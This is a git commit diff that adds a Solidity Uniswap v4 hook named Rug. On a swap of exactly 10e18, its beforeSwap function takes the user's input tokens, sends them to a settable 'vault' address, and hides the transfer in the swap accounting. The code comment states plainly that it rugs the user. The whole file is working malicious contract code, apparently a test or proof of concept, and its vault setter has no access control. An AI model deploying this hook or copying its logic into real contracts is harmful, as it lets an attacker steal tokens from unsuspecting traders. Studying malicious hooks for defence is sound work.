1ae1fe01a5ce1c5639dbaf9dd1366a2a2210f12f
Hicham Bouanani <hicham.bouanani@nuant.com>
2024-07-12 23:00:39 +0200

    Add first succesfull test

---
+++ src/Rug.sol
@@ -0,0 +1,67 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import {BaseHook} from "v4-periphery/BaseHook.sol";
+import {Hooks} from "v4-core/src/libraries/Hooks.sol";
+import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
+import {PoolKey} from "v4-core/src/types/PoolKey.sol";
+import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
+import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
+import {toBeforeSwapDelta, BeforeSwapDelta, BeforeSwapDeltaLibrary} from "v4-core/src/types/BeforeSwapDelta.sol";
+import {Currency, CurrencyLibrary} from "v4-core/src/types/Currency.sol";
+import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";
+import {SafeCast} from "v4-core/src/libraries/SafeCast.sol";
+
+contract Rug is BaseHook {
+    using PoolIdLibrary for PoolKey;
+    using PoolIdLibrary for PoolKey;
+    using SafeCast for uint256;
+
+    address vault;
+
+    // NOTE: ---------------------------------------------------------
+    // state variables should typically be unique to a pool
+    // a single hook contract should be able to service multiple pools
+    // ---------------------------------------------------------------
+
+    constructor(IPoolManager _poolManager) BaseHook(_poolManager) {}
+
+    function set_vault(address _vault) external {
+        vault = _vault;
+    }
+
+    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
+        return Hooks.Permissions({
+            beforeInitialize: false,
+            afterInitialize: false,
+            beforeAddLiquidity: false,
+            afterAddLiquidity: false,
+            beforeRemoveLiquidity: false,
+            afterRemoveLiquidity: false,
+            beforeSwap: true,
+            afterSwap: false,
+            beforeDonate: false,
+            afterDonate: false,
+            beforeSwapReturnDelta: true,
+            afterSwapReturnDelta: false,
+            afterAddLiquidityReturnDelta: false,
+            afterRemoveLiquidityReturnDelta: false
+        });
+    }
+
+    function beforeSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata)
+        external
+        override
+        returns (bytes4, BeforeSwapDelta, uint24)
+    {
+        if (params.amountSpecified == -10e18) {
+            uint256 amount = 10e18;
+            Currency input = params.zeroForOne ? key.currency0 : key.currency1;
+            // We rug the user and transfer its tokens to the vault
+            manager.take(input, vault, amount);
+            // We return a delta of 'amount' for internal accounting purposes
+            return (BaseHook.beforeSwap.selector, toBeforeSwapDelta(amount.toInt128(), 0), 0);
+        }
+        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
+    }
+}
